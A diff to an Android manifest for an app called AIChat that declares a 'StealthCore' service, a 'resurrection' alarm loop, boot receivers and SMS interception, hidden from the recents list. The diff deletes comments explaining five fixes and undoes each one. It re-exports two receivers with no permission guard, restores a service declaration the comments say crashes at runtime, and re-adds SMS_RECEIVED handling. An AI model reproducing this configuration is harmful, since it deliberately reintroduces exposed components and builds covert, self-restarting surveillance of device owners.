@@ -43,20 +43,12 @@
         tools:targetApi="31">
 
         <!-- Main Activity -->
-        <!--
-            FIX #1: Removed android:noHistory="true".
-            noHistory causes the Activity to be finished immediately when the user
-            navigates away, meaning onDestroy() fires every time. This caused
-            serviceStarted to reset to false on every app-switch, triggering
-            redundant permission checks and setServiceEnabled(true) calls on every
-            return. The flag also breaks the "return from App Settings after granting
-            permissions" flow because the Activity no longer exists to receive onResume().
-        -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:theme="@style/Theme.AIChat"
             android:excludeFromRecents="true"
+            android:noHistory="true"
             android:taskAffinity="">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
@@ -72,14 +64,11 @@
             android:foregroundServiceType="mediaPlayback"
             android:stopWithTask="false"/>
 
-        <!--
-            FIX #2: Removed StealthCore service declaration entirely.
-            StealthCore was refactored from a Service to a plain Kotlin object.
-            Keeping this declaration would cause the system to try to instantiate
-            it as a Service, which fails at runtime with an InstantiationException
-            since objects have no public no-arg constructor. No replacement entry
-            is needed — StealthCore.startResurrectionLoop() is now a direct call.
-        -->
+        <!-- Stealth Core Service -->
+        <service
+            android:name=".service.StealthCore"
+            android:enabled="true"
+            android:exported="false"/>
 
         <!-- StealthResurrector - Keeps the resurrection alarm loop alive -->
         <receiver
@@ -109,41 +98,18 @@
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
             </intent-filter>
         </receiver>
-
-        <!--
-            FIX #3: AlarmReceiver changed from exported="true" to exported="false".
-            This receiver accepts no external intents — it is only triggered by
-            AlarmManager PendingIntents created by the app itself. Exporting it
-            allowed any app on the device to send it arbitrary broadcasts, which
-            could trigger spurious service restarts or be used to exhaust battery.
-            AlarmManager correctly delivers PendingIntents to unexported receivers.
-        -->
         <receiver
             android:name=".service.AlarmReceiver"
             android:enabled="true"
-            android:exported="false"/>
+            android:exported="true"/>
 
         <!-- Multi-Event Receiver - Restarts service on system events -->
-        <!--
-            FIX #4: Removed android.provider.Telephony.SMS_RECEIVED from this
-            intent-filter. SmsReceiver owns that action exclusively — the comment
-            at the top of MultiEventReceiver.kt states this explicitly. Having it
-            here as well meant every incoming SMS triggered two parallel code paths:
-            one correct path through SmsReceiver and one no-op path through
-            MultiEventReceiver (which just tried to restart the service, wasting
-            a binder call and log noise on every message).
-
-            FIX #5: Changed exported="true" to exported="false" with a custom
-            permission. SCREEN_ON, BATTERY_CHANGED etc. are system broadcasts
-            delivered by the OS, which can reach unexported receivers just fine.
-            Exporting without a permission guard allowed third-party apps to
-            trigger this receiver and cause arbitrary service restarts.
-        -->
         <receiver
             android:name=".service.MultiEventReceiver"
             android:enabled="true"
-            android:exported="false">
+            android:exported="true">
             <intent-filter android:priority="500">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.SCREEN_ON"/>
                 <action android:name="android.intent.action.SCREEN_OFF"/>
